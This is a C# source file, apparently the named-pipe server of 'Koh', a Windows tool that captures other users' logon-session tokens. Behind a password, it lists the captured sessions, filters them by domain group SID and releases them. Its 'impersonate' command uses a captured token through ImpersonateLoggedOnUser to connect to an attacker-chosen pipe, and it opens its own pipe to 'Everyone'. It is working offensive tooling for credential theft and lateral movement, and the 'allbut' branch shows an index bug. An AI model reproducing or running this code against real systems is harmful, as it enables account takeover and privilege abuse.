using System;
using System.Collections.Concurrent;
using System.IO.Pipes;
using System.Threading;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.ComponentModel;

// The main namedpipe logic that handles commands for the Koh server

namespace Koh
{
    public class PipeServer
    {
        Thread runningThread;

        private string _pipeName;
        private string _password;
        private string _mode;
        private bool _debug;
        private ConcurrentDictionary<string, int> _meta;
        private ConcurrentDictionary<string, Capture.CapturedSession> _capturedSessions;
        private ConcurrentDictionary<string, bool> _excludeSids;
        private ConcurrentDictionary<string, bool> _filterSids;

        public PipeServer(string pipeName, string password, ConcurrentDictionary<string, int> meta, ConcurrentDictionary<string, Capture.CapturedSession> capturedSessions, ConcurrentDictionary<string, bool> excludeSids, ConcurrentDictionary<string, bool> filterSids, string mode, bool debug = false)
        {
            _pipeName = pipeName;
            _password = password;
            _mode = mode;
            _meta = meta;
            _capturedSessions = capturedSessions;
            _excludeSids = excludeSids;
            _filterSids = filterSids;
            _debug = debug;
        }

        void ServerLoop()
        {
            // check if we've been signaled to exit
            while (_meta["SignalExit"] != 1)
            {
                ProcessNextClient();
            }
        }

        public void Run()
        {
            Console.WriteLine($"\n  [*] Starting server with named pipe: {_pipeName}");

            runningThread = new Thread(ServerLoop);
            runningThread.Start();
        }

        public void Stop()
        {
            _meta["SignalExit"] = 1;
        }

        public void ProcessClientThread(object o)
        {
            NamedPipeServerStream pipeStream = (NamedPipeServerStream)o;
            string responseMsg = "Incorrect usage";
            byte[] inBuffer = new byte[4096];

            if (pipeStream.CanRead)
            {
                pipeStream.Read(inBuffer, 0, 4096);
            }
            
            var input = System.Text.Encoding.ASCII.GetString(inBuffer).Trim('\0').Trim();
            string[] parts = input.Split(' ');
            if (_debug)
            {
                Console.WriteLine($"DEBUG ({DateTime.Now}) Command: {input}");
            }

            if (parts.Length > 1)
            {
                if (parts[0] == _password)
                {
                    string command = parts[1].ToLower();
                    if (command == "list")
                    {
                        // lists currently captured sessions/tokens
                        responseMsg = "";
                        foreach (var capturedSession in _capturedSessions)
                        {
                            Capture.CapturedSession sess = capturedSession.Value;
                            if ((sess.TokenHandle != IntPtr.Zero) || (_mode == "monitor"))
                            {
                                if (pipeStream.CanWrite)
                                {
                                    responseMsg += $"\nUsername     : {sess.UserName} ({sess.SID})\nLUID         : {sess.Luid}\nCaptureTime  : {sess.CaptureTime}\nLogonType    : {sess.LogonType}\nAuthPackage  : {sess.AuthPackage}\nCredUserName : {sess.CredUser}\nOrigin LUID  : {sess.OriginLUID}\n";
                                }
                            }
                        }
                        if(responseMsg == "")
                        {
                            responseMsg = "[!] No current sessions captured";
                        }
                    }
                    else if (command == "filter")
                    {
                        // lists, adds, or resets the SIDs tofilter
                        responseMsg = "";

                        if (parts.Length == 3 && (parts[2] == "list"))
                        {
                            if (_filterSids.Keys.Count == 0)
                            {
                                responseMsg = "[!] No group SIDs current set for capture filtering.";
                            }
                            else
                            {
                                responseMsg = "[*] Current group SIDs set for capture filtering:\n";
                                foreach (var sidString in _filterSids.Keys)
                                {
                                    responseMsg += $"    {sidString}\n";
                                }
                            }
                        }
                        else if (parts.Length == 4 && (parts[2] == "add") && (Helpers.IsDomainSid(parts[3])))
                        {
                            if(_filterSids.TryAdd(parts[3], true))
                            {
                                responseMsg = $"[*] Added {parts[3]} group SID to capture filtering.";
                            }
                            else
                            {
                                responseMsg = $"[!] Error adding {parts[3]} group SID to capture filtering!";
                            }
                        }
                        else if (parts.Length == 4 && (parts[2] == "remove") && (Helpers.IsDomainSid(parts[3])))
                        {
                            bool val = false;
                            if (_filterSids.TryRemove(parts[3], out val))
                            {
                                responseMsg = $"[*] Removed {parts[3]} group SID from capture filtering.";
                            }
                            else
                            {
                                responseMsg = $"[!] Error removing {parts[3]} group SID to capture filtering!";
                            }
                        }
                        else if (parts.Length == 3 && (parts[2] == "reset"))
                        {
                            responseMsg = "[*] Reset all filtering SIDs";
                            _filterSids.Clear();
                            _excludeSids.Clear();
                        }
                    }
                    else if (command == "release")
                    {
                        if (_mode == "monitor")
                        {
                            responseMsg = $"[X] Cannot release tokens in monitor mode";
                        }
                        // releases all tokens/sessions, or a token for a specified LUID
                        if ((parts.Length == 3) && (_mode == "capture"))
                        {
                            ulong luid = 0;
                            if (parts[2].ToLower() == "all")
                            {
                                // "release all" -> release all tokens

                                foreach (var capturedSession in _capturedSessions)
                                {
                                    Interop.CloseHandle(capturedSession.Value.TokenHandle);
                                }
                                _capturedSessions.Clear();
                                responseMsg = $"[*] Released all captured tokens";
                            }
                            else if (parts[2].ToLower() == "allbut")
                            {
                                // "release all" -> release all tokens except the on for the specific LUID

                                if (parts.Length < 4)
                                {
                                    responseMsg = "[!] Usage: 'release allbut LUID'";
                                }
                                else
                                {
                                    if (ulong.TryParse(parts[4], out luid)) {

                                        foreach (var capturedSession in _capturedSessions)
                                        {
                                            if (capturedSession.Value.Luid != luid)
                                            {
                                                Interop.CloseHandle(capturedSession.Value.TokenHandle);
                                                Capture.CapturedSession temp = new Capture.CapturedSession();
                                                _capturedSessions.TryRemove(capturedSession.Key, out temp);
                                            }
                                        }

                                        responseMsg = $"[*] Released all captured tokens except the token for LUID '{parts[3]}'";
                                    }
                                    else
                                    {
                                        responseMsg = "[!] Usage: 'release allbut LUID'";
                                    }
                                }
                            }
                            else if (ulong.TryParse(parts[2], out luid))
                            {
                                // release LUID -> release token for specific LUID
                                foreach (var capturedSession in _capturedSessions)
                                {
                                    if (capturedSession.Value.Luid == luid)
                                    {
                                        Interop.CloseHandle(capturedSession.Value.TokenHandle);
                                        Capture.CapturedSession temp = new Capture.CapturedSession();
                                        if (_capturedSessions.TryRemove(capturedSession.Key, out temp))
                                        {
                                            responseMsg = $"[*] Released token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid}";
                                        }
                                        else
                                        {
                                            responseMsg = $"[!] Error releasing token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid} !";
                                        }
                                    }
                                }
                            }
                        }
                    }
                    else if (command == "groups")
                    {
                        if (_mode == "monitor")
                        {
                            responseMsg = $"[X] Cannot list groups in monitor mode";
                        }
                        // lists the domain group SIDs for a specified token
                        if ((parts.Length == 3) && (_mode == "capture"))
                        {
                            ulong luid = 0;
                            if (ulong.TryParse(parts[2], out luid))
                            {
                                foreach (var capturedSession in _capturedSessions)
                                {
                                    if (capturedSession.Value.Luid == luid)
                                    {
                                        List<string> groupSids = Helpers.GetTokenGroups(capturedSession.Value.TokenHandle);
                                        responseMsg = String.Join("\n", groupSids.Where(x => Helpers.IsDomainSid(x)).ToArray());
                                    }
                                }
                            }
                        }
                    }
                    else if (command == "impersonate")
                    {
                        // impersonate LUID PipeName
                        if(_mode == "monitor")
                        {
                            responseMsg = $"[X] Cannot impersonate in monitor mode";
                        }
                        if ((parts.Length == 4) && (_mode == "capture"))
                        {
                            ulong luid = 0;
                            if (ulong.TryParse(parts[2], out luid))
                            {
                                string pipeName = parts[3];
                                responseMsg = "[!] LUID not found!";
                                foreach (var capturedSession in _capturedSessions)
                                {
                                    if (capturedSession.Value.Luid == luid)
                                    {
                                        bool success = Interop.ImpersonateLoggedOnUser(capturedSession.Value.TokenHandle);
                                        if (success)
                                        {
                                            responseMsg = $"[*] Impersonating token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid} to {pipeName}";

                                            // 0x80000000 | 0x40000000 -> GENERIC_READ | GENERIC_WRITE
                                            // 3 -> OPEN_EXISTING
                                            Thread.Sleep(1000);
                                            IntPtr hPipe = Interop.CreateFile($"{pipeName}", 0x80000000 | 0x40000000, 0, 0, 3, 0, 0);

                                            if (hPipe.ToInt64() == -1)
                                            {
                                                var ex = new Win32Exception(Marshal.GetLastWin32Error());
                                                Console.WriteLine($"  [X] Error conecting to {pipeName} : {ex.Message} ({ex.ErrorCode})");
                                            }
                                            else
                                            {
                                                // write a single byte out so we can fulfil the ReadFile() requirement on the other side of the pipe
                                                byte[] bytes = new byte[1];
                                                uint written = 0;
                                                Interop.WriteFile(hPipe, bytes, (uint)bytes.Length, out written, IntPtr.Zero);
                                                Thread.Sleep(500);
                                            }

                                            Interop.RevertToSelf();
                                        }
                                        else
                                        {
                                            responseMsg = $"[!] Error impersonating token {capturedSession.Value.TokenHandle} for LUID {capturedSession.Value.Luid} to pipe {pipeName}";
                                        }
                                    }
                                }
                            }
                        }
                    }
                    else if (command == "exit")
                    {
                        responseMsg = $"[*] Koh is exiting...";
                        _meta["SignalExit"] = 1;
                    }

                    if (command != "impersonate")
                    {
                        byte[] outBuffer = System.Text.Encoding.ASCII.GetBytes(responseMsg);
                        pipeStream.Write(outBuffer, 0, responseMsg.Length);
                    }
                }
            }

            if (_debug)
            {
                Console.WriteLine($"DEBUG ({DateTime.Now}) Response: {responseMsg}");
            }

            try
            {
                pipeStream.Close();
            }
            catch { }
            try
            {
                pipeStream.Dispose();
            }
            catch { }
        }

        public void ProcessNextClient()
        {
            try
            {
                PipeSecurity pipeSecurity = new PipeSecurity();
                pipeSecurity.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));

                NamedPipeServerStream pipeStream = new NamedPipeServerStream(
                    _pipeName,
                    PipeDirection.InOut,
                    -1,
                    PipeTransmissionMode.Message,
                    PipeOptions.Asynchronous,
                    4096,
                    4096,
                    pipeSecurity);

                pipeStream.WaitForConnection();

                // Spawn a new thread for each request and continue waiting
                Thread t = new Thread(ProcessClientThread);
                t.Start(pipeStream);
                t.Join();
            }
            catch
            {
            }
        }
    }
}
